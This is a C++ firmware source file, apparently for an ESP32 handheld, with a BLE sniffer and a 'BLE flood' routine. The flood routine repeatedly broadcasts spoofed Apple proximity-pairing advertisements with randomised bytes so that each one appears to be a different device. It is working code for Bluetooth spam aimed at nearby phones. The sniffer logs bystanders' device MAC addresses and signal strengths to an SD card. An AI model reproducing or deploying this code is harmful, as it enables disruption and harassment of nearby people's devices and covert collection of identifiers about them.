#include "ble_tasks.h"
#include "constants.h"
#include "sd_logger.h"
#include <NimBLEDevice.h>
#include <esp_task_wdt.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_random.h>

extern lv_obj_t *lbl_ble_status, *btn_ble_flood, *btn_ble_sniff;

static AppContext* ble_context = nullptr;
static BLESniffCB* ble_sniffer_cb_instance = nullptr;

// Implementation of the callback class
BLESniffCB::BLESniffCB(AppContext* context) : app_context(context) {}

void BLESniffCB::onResult(const NimBLEAdvertisedDevice *dev) {
    if (!app_context) return;
    BleState& ble = app_context->ble;

    ble.packet_count++;
    uint8_t slot = ble.ring_head % BLE_RING_SIZE;
    strncpy(ble.ring_buf[slot].mac, dev->getAddress().toString().c_str(), 17);
    ble.ring_buf[slot].mac[17] = 0;
    ble.ring_buf[slot].rssi = dev->getRSSI();
    ble.ring_buf[slot].fresh = true;
    ble.ring_head++;
}

void ble_tasks_init(AppContext* context) {
    ble_context = context;
    ble_sniffer_cb_instance = new BLESniffCB(context);
}

void stop_ble(AppContext* context) {
    if (!context->ble.sniff_active && !context->ble.flood_active) return;

    uint32_t wait_start = millis();
    while (context->ble.busy && millis() - wait_start < 500) {
        esp_task_wdt_reset();
        delay(5);
    }
    if (context->ble.busy) {
        // Force-clear stuck state
        context->ble.flood_active = false;
        context->ble.sniff_active = false;
        context->ble.nimble_ready = false;
        context->ble.busy = false;
        if (btn_ble_flood) lv_label_set_text(lv_obj_get_child(btn_ble_flood, 0), "START BLE FLOOD");
        if (btn_ble_sniff) lv_label_set_text(lv_obj_get_child(btn_ble_sniff, 0), "START BLE SNIFF");
        lv_label_set_text(lbl_ble_status, "#FF4444 BLE ERROR — rebooting may be needed#");
        return;
    }

    context->ble.busy = true;

    if (context->ble.sniff_active) {
        context->ble.sniff_active = false;
        if (context->ble.scanner) {
            context->ble.scanner->setScanCallbacks(nullptr);
            context->ble.scanner->stop();
        }
        esp_task_wdt_reset(); delay(200); esp_task_wdt_reset();
        if (context->ble.nimble_ready) {
            NimBLEDevice::deinit(true);
            context->ble.nimble_ready = false;
            context->ble.scanner = nullptr;
        }
        esp_task_wdt_reset(); delay(100); esp_task_wdt_reset();
        if (btn_ble_sniff) lv_label_set_text(lv_obj_get_child(btn_ble_sniff, 0), "START BLE SNIFF");
    }

    if (context->ble.flood_active) {
        context->ble.flood_active = false;
        if (context->ble.nimble_ready) {
            // Stop advertising safely before deinit
            NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
            if (adv) adv->stop();
            esp_task_wdt_reset(); delay(50); esp_task_wdt_reset();
            NimBLEDevice::deinit(true);
            context->ble.nimble_ready = false;
            esp_task_wdt_reset(); delay(50); esp_task_wdt_reset();
        }
        if (btn_ble_flood) lv_label_set_text(lv_obj_get_child(btn_ble_flood, 0), "START BLE FLOOD");
    }

    lv_label_set_text(lbl_ble_status, "#00FFCC BLE READY#\n\nSelect an action.");
    context->ble.busy = false;
}

void start_ble_sniff(AppContext* context) {
    if (context->ble.busy) return;
    context->ble.busy = true;

    if (context->ble.flood_active) stop_ble(context);

    context->wifi_scan.paused = true;
    esp_wifi_set_promiscuous(false);
    // Only call disconnect if WiFi was actually initialized
    wifi_mode_t mode;
    if (esp_wifi_get_mode(&mode) == ESP_OK) {
        WiFi.disconnect(true);
    }
    esp_task_wdt_reset(); delay(50); esp_task_wdt_reset();

    NimBLEDevice::init("");
    context->ble.nimble_ready = true;
    context->ble.scanner = NimBLEDevice::getScan();
    context->ble.scanner->setScanCallbacks(ble_sniffer_cb_instance, true);
    context->ble.scanner->setActiveScan(true);
    context->ble.scanner->setInterval(100);
    context->ble.scanner->setWindow(99);
    esp_task_wdt_reset();
    context->ble.scanner->start(0, false, true);

    context->ble.unique_macs.clear();
    context->ble.packet_count = 0;
    context->ble.sniff_active = true;
    context->ble.busy = false;
}

void start_ble_flood(AppContext* context) {
    if (context->ble.busy) return;
    context->ble.busy = true;

    if (context->ble.sniff_active) stop_ble(context);

    context->wifi_scan.paused = true;
    esp_wifi_set_promiscuous(false);
    // Only call disconnect if WiFi was actually initialized
    wifi_mode_t mode;
    if (esp_wifi_get_mode(&mode) == ESP_OK) {
        WiFi.disconnect(true);
    }
    esp_task_wdt_reset();

    // Init NimBLE once here — process_ble_flood will reuse it each cycle
    // rather than deinit/reinit every 300ms (which causes PC=0x0 crash)
    if (!context->ble.nimble_ready) {
        NimBLEDevice::init("");
        context->ble.nimble_ready = true;
    }

    context->ble.flood_active = true;
    context->ble.busy = false;
}

void process_ble_sniff_ui(AppContext* context) {
    if (!context->ble.sniff_active) return;
    BleState& ble = context->ble;

    for (int i = 0; i < BLE_RING_SIZE; i++) {
        if (!ble.ring_buf[i].fresh) continue;
        ble.ring_buf[i].fresh = false;
        String mac(ble.ring_buf[i].mac);
        if (mac.length() > 0 && ble.unique_macs.find(mac.c_str()) == ble.unique_macs.end()) {
            if (ble.unique_macs.size() > MAX_LIST_MEMORY) ble.unique_macs.clear();
            ble.unique_macs.insert(mac.c_str());
            ble.last_mac = mac;
            if (sd_card_ready()) {
                sd_log_ble_sniff(millis(), mac.c_str(), ble.ring_buf[i].rssi);
            }
        }
    }

    static uint32_t last_ui = 0;
    if (millis() - last_ui < 1000) return;
    char buf[256];
    snprintf(buf, sizeof(buf), "#00FFCC BLE SNIFFER#\n\nPackets: %lu\nUnique: %u\nLast: %s",
             ble.packet_count, (uint32_t)ble.unique_macs.size(), ble.last_mac.c_str());
    lv_label_set_text(lbl_ble_status, buf);
    last_ui = millis();
}

void process_ble_flood(AppContext* context) {
    if (!context->ble.flood_active || context->ble.busy) return;
    static uint32_t last_ble = 0;
    if (millis() - last_ble < 300) return;

    // Guard: NimBLE must be initialized (done once in start_ble_flood)
    if (!context->ble.nimble_ready) return;

    context->ble.busy = true;

    // Reuse the existing NimBLE instance — just stop, update payload, restart.
    // Do NOT deinit/reinit every cycle: after deinit the host task is destroyed
    // and getAdvertising() returns a pointer with a NULL vtable, causing PC=0x0 crash.
    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    if (!adv) {
        context->ble.busy = false;
        return;
    }

    adv->stop();
    esp_task_wdt_reset();

    // Randomize the 6 filler bytes in the Apple proximity payload so each
    // beacon looks like a different device
    uint8_t ap[] = {0x4C,0x00,0x07,0x19,0x01,0x0A,0x20,0x55,0x14,0x58,0x6E,0x42,
                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
    esp_fill_random(&ap[12], 6); // randomize trailing bytes

    NimBLEAdvertisementData d;
    d.setManufacturerData(std::string((char*)ap, sizeof(ap)));
    adv->setAdvertisementData(d);
    adv->start();

    last_ble = millis();
    context->ble.busy = false;
}
